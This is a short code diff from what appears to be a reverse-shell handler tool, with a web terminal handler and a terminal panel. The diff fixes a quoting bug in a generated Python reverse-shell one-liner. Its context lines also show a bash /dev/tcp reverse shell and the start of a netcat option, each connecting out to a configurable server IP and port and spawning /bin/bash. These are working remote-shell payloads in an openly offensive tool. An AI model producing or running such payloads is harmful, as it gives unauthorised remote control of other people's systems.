@@ -1071,7 +1071,7 @@ class WebTerminalHandler(BaseHTTPRequestHandler):
             
             shell_code = ""
             if shell_type == "python":
-                shell_code = f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{server_ip}",{SHELL_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")''''
+                shell_code = f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{server_ip}",{SHELL_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'''
             elif shell_type == "bash":
                 shell_code = f'bash -i >& /dev/tcp/{server_ip}/{SHELL_PORT} 0>&1'
             elif shell_type == "nc":
@@ -1298,7 +1298,7 @@ class TerminalPanel:
             shell_type = shell_types[choice]
             
             if shell_type == "python":
-                shell_code = f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{server_ip}",{SHELL_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")''''
+                shell_code = f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{server_ip}",{SHELL_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'''
             elif shell_type == "bash":
                 shell_code = f'bash -i >& /dev/tcp/{server_ip}/{SHELL_PORT} 0>&1'
             elif shell_type == "nc":
